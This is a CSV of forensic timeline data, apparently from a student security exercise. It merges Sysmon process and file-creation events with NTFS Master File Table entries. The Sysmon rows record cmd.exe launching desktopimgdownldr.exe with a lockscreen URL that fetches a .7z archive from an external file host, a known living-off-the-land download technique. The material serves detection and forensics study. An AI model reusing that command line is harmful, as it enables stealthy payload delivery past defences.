Source,Artifact_Type,RecordNumber,EventRecordId,TimeCreated,EventId,Level,Provider,Channel,ProcessId,ThreadId,Computer,ChunkNumber,UserId,MapDescription,UserName,RemoteHost,PayloadData1,PayloadData2,PayloadData3,PayloadData4,PayloadData5,PayloadData6,ExecutableInfo,HiddenRecord,SourceFile,Keywords,ExtraDataOffset,Payload,EntryNumber,SequenceNumber,InUse,ParentEntryNumber,ParentSequenceNumber,ParentPath,FileName,Extension,FileSize,ReferenceCount,ReparseTarget,IsDirectory,HasAds,IsAds,SI<FN,uSecZeros,Copied,SiFlags,NameType,Created0x10,Created0x30,LastModified0x10,LastModified0x30,LastRecordChange0x10,LastRecordChange0x30,LastAccess0x10,LastAccess0x30,UpdateSequenceNumber,LogfileSequenceNumber,SecurityId,ObjectIdFileDroid,LoggedUtilStream,ZoneIdContents,HivePath,HiveType,Description,Category,KeyPath,ValueName,ValueType,ValueData,ValueData2,ValueData3,Comment,Recursive,Deleted,LastWriteTimestamp,PluginDetailFile
EVTX,Event Log,1.0,305352.0,2020-07-03 08:47:20.037922900+00:00,1.0,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3324.0,4016.0,MSEDGEWIN10,0.0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 1932, ProcessGUID: 747f3d96-f098-5efe-0000-001012e13801",RuleName: ,"SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 5384, ParentProcessGUID: 747f3d96-ef3d-5efe-0000-0010f3653401","ParentCommandLine: ""C:\Windows\system32\cmd.exe"" ",cmd  /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ,False,c:\Users\Andrei\Desktop\COLLEGE\3RD YEAR\2ND TERM\NSSECU3\mp3\combinedtool\combinedtool\sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx,Classic,0.0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-03 08:47:20.001""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-f098-5efe-0000-001012e13801""},{""@Name"":""ProcessId"",""#text"":""1932""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.592 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Windows Command Processor""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""Cmd.Exe""},{""@Name"":""CommandLine"",""#text"":""cmd  /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-1ce4-5efe-0000-0020cc9c0800""},{""@Name"":""LogonId"",""#text"":""0x89CCC""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=8C5437CD76A89EC983E3B364E219944DA3DAB464,MD5=975B45B669930B0CC773EAF2B414206F,SHA256=3656F37A1C6951EC4496FABB8EE957D3A6E3C276D5A3785476B482C9C0D32EA2,IMPHASH=272245E2988E1E430500B852C4FB5E18""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-ef3d-5efe-0000-0010f3653401""},{""@Name"":""ParentProcessId"",""#text"":""5384""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""\""C:\\Windows\\system32\\cmd.exe\"" ""}]}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EVTX,Event Log,2.0,305354.0,2020-07-03 08:47:20.073262600+00:00,1.0,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3324.0,4016.0,MSEDGEWIN10,0.0,S-1-5-18,Process creation,MSEDGEWIN10\IEUser,,"ProcessID: 4604, ProcessGUID: 747f3d96-f098-5efe-0000-001090e33801",RuleName: ,"SHA1=BCDDCFFCA3754875261EF1427EC4F5F4BFB8C2CE,MD5=A6DAD18B0AA125535C7FB9BBFDA25266,SHA256=0A6A2690C68CF685D8FCC9F3EA78C35BBF6F296B7B33C956B39400DF749DBC78,IMPHASH=F8D617766CF1026390A712DFC1AE2EDA",ParentProcess: C:\Windows\System32\cmd.exe,"ParentProcessID: 1932, ParentProcessGUID: 747f3d96-f098-5efe-0000-001012e13801",ParentCommandLine: cmd  /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ,desktopimgdownldr.exe  /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ,False,c:\Users\Andrei\Desktop\COLLEGE\3RD YEAR\2ND TERM\NSSECU3\mp3\combinedtool\combinedtool\sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx,Classic,0.0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-03 08:47:20.055""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-f098-5efe-0000-001090e33801""},{""@Name"":""ProcessId"",""#text"":""4604""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\desktopimgdownldr.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1075 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""desktopimgdownldr.exe""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""desktopimgdownldr.exe""},{""@Name"":""CommandLine"",""#text"":""desktopimgdownldr.exe  /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\IEUser\\""},{""@Name"":""User"",""#text"":""MSEDGEWIN10\\IEUser""},{""@Name"":""LogonGuid"",""#text"":""747f3d96-1ce4-5efe-0000-0020cc9c0800""},{""@Name"":""LogonId"",""#text"":""0x89CCC""},{""@Name"":""TerminalSessionId"",""#text"":""1""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""SHA1=BCDDCFFCA3754875261EF1427EC4F5F4BFB8C2CE,MD5=A6DAD18B0AA125535C7FB9BBFDA25266,SHA256=0A6A2690C68CF685D8FCC9F3EA78C35BBF6F296B7B33C956B39400DF749DBC78,IMPHASH=F8D617766CF1026390A712DFC1AE2EDA""},{""@Name"":""ParentProcessGuid"",""#text"":""747f3d96-f098-5efe-0000-001012e13801""},{""@Name"":""ParentProcessId"",""#text"":""1932""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\cmd.exe""},{""@Name"":""ParentCommandLine"",""#text"":""cmd  /c desktopimgdownldr.exe /lockscreenurl:https://a.uguu.se/Hv0bgvgHGNeH_Bin.7z /eventName:desktopimgdownldr ""}]}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
EVTX,Event Log,3.0,305356.0,2020-07-03 08:47:21.491108+00:00,11.0,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,3324.0,4016.0,MSEDGEWIN10,0.0,S-1-5-18,FileCreate,,,"ProcessID: 1556, ProcessGUID: 747f3d96-2178-5efe-0000-0010aada5800",RuleName: ,Image: C:\Windows\System32\svchost.exe,TargetFilename: C:\Users\IEUser\AppData\Local\Temp\Personalization\LockScreenImage\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z,,,,False,c:\Users\Andrei\Desktop\COLLEGE\3RD YEAR\2ND TERM\NSSECU3\mp3\combinedtool\combinedtool\sysmon_11_1_lolbas_downldr_desktopimgdownldr.evtx,Classic,0.0,"{""EventData"":{""Data"":[{""@Name"":""RuleName""},{""@Name"":""UtcTime"",""#text"":""2020-07-03 08:47:21.485""},{""@Name"":""ProcessGuid"",""#text"":""747f3d96-2178-5efe-0000-0010aada5800""},{""@Name"":""ProcessId"",""#text"":""1556""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\IEUser\\AppData\\Local\\Temp\\Personalization\\LockScreenImage\\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z""},{""@Name"":""CreationUtcTime"",""#text"":""2020-07-03 08:47:21.485""}]}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
MFT,Master File Table,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,1.0,True,5.0,5.0,.,$MFT,,385056768.0,1.0,,False,False,False,False,False,False,Hidden|System,DosWindows,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,1970-01-01 00:00:00+00:00,64323867495.0,256.0,,,,,,,,,,,,,,,,,,
MFT,Master File Table,,,,,,,,,,,,,,,,,,,,,,,,,,,,1.0,1.0,True,5.0,5.0,.,$MFTMirr,,4096.0,1.0,,False,False,False,False,False,False,Hidden|System,DosWindows,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,1970-01-01 00:00:00+00:00,33558317.0,256.0,,,,,,,,,,,,,,,,,,
MFT,Master File Table,,,,,,,,,,,,,,,,,,,,,,,,,,,,2.0,2.0,True,5.0,5.0,.,$LogFile,,67108864.0,1.0,,False,False,False,False,False,False,Hidden|System,DosWindows,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,1970-01-01 00:00:00+00:00,33558387.0,256.0,,,,,,,,,,,,,,,,,,
MFT,Master File Table,,,,,,,,,,,,,,,,,,,,,,,,,,,,3.0,3.0,True,5.0,5.0,.,$Volume,,0.0,1.0,,False,False,False,False,False,False,Hidden|System,DosWindows,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,1970-01-01 00:00:00+00:00,64357402668.0,257.0,e069c3d8-b531-46bf-b20e-df0d6254aef8,,,,,,,,,,,,,,,,,
MFT,Master File Table,,,,,,,,,,,,,,,,,,,,,,,,,,,,4.0,4.0,True,5.0,5.0,.,$AttrDef,,2560.0,1.0,,False,False,False,False,False,False,Hidden|System,DosWindows,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,1970-01-01 00:00:00+00:00,33559448.0,0.0,,,,,,,,,,,,,,,,,,
MFT,Master File Table,,,,,,,,,,,,,,,,,,,,,,,,,,,,5.0,5.0,True,5.0,5.0,.,.,,0.0,1.0,,True,False,False,False,False,False,Hidden|System,DosWindows,2010-04-24 04:49:13.171875+00:00,,2018-02-04 13:12:06.093750+00:00,2016-06-04 04:43:38.187500+00:00,2018-02-04 13:12:06.093750+00:00,2016-06-04 04:43:38.187500+00:00,2018-02-05 18:43:39.921875+00:00,2016-06-04 05:46:15.796875+00:00,1970-01-01 00:00:00+00:00,88119229379.0,0.0,33131975-8d14-11df-9df9-005056c00008,$TXF_DATA,,,,,,,,,,,,,,,,
MFT,Master File Table,,,,,,,,,,,,,,,,,,,,,,,,,,,,6.0,6.0,True,5.0,5.0,.,$Bitmap,,1900024.0,1.0,,False,False,False,False,False,False,Hidden|System,DosWindows,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,2010-04-24 04:49:13.171875+00:00,,1970-01-01 00:00:00+00:00,38453486003.0,256.0,,,,,,,,,,,,,,,,,,
